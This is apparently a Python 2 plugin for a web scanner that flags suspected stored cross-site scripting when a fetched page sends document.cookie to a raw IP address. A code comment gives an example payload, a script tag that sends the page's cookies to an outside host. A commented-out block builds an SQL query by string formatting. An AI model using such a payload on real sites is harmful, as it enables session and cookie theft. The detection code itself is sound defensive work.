#!/usr/bin/python
# -*- coding: utf-8 -*-
import MySQLdb
import MySQLdb.cursors
from engine.engine_utils.common import *
import urlparse
from engine.logger import scanLogger as logger
from engine.engineConfig import *


def run_url(http,ob,item):
    result = []
    try:
        # 检测本站页面
        domain = ob['domain']
        header = {'Host': domain}
        source_ip = ob.get('source_ip')
        url = item['url']
        url_parse = urlparse.urlparse(url)
        scheme = url_parse.scheme
        domain = url_parse.netloc
        path = url_parse.path
        query = url_parse.query

        if source_ip:
            domain = source_ip
        if query:
            url = "%s://%s%s?%s" % (scheme, domain, path, query)
        else:
            url = "%s://%s%s" % (scheme, domain, path)

        res, content = http.request(url, 'GET', headers=header)
        if res and res.get('status') == '200' and content:
            # <script>window.open('http://10.65.20.196:8080/cookie.asp?msg='+document.cookie)</script>
            if re.search('http://(\d{1,3}\.){3}\d{1,3}.{0,100}?document\.cookie', content, re.I):
                detail = "检测到可疑的存储型跨站脚本攻击"
                request = getRequest(url, domain=ob['domain'])
                response = getResponse(res, content)
                result.append(getRecord(ob, url, ob['level'], detail, request, response))

        # # 检测外站链接
        # task_id = ob['taskId']
        # # other_urls = db.session.query(SpiderUrlOther.url).filter(SpiderUrlOther.task_id == task_id, SpiderUrlOther.type == 1).all()
        # sql = "SELECT spider_url_other.url FROM spider_url_other WHERE task_id=%s AND TYPE=%s" % (task_id, 1)
        # db = MySQLdb.connect(SCANER_DB_HOST, SCANER_DB_USER, SCANER_DB_PASSWORD, SCANER_DB_DATABASE, cursorclass = MySQLdb.cursors.DictCursor)
        # cursor = db.cursor()
        # cursor.execute(sql)
        # other_url_list = cursor.fetchall()
        # if other_url_list:
        #
        #     for other_url in other_url_list:
        #         url = other_url.get('url')
        #         if re.search('\.js', url):
        #             res, content = requestUrl(http, url)
        #             if res and res.get('status') == 200 and content:
        #                 for keyword in keyword_list:
        #                     if re.search(keyword, content, re.I):
        #                         detail = "检测到可疑的存储型跨站脚本攻击"
        #                         request = getRequest(url)
        #                         response = getResponse(res, content)
        #                         result.append(getRecord(ob, url, ob['level'], detail, request, response))
    except Exception, e:
        logger.error("File:ScanStorageXssScript_yd.py, run_domain function :%s" % (str(e)))

    return result




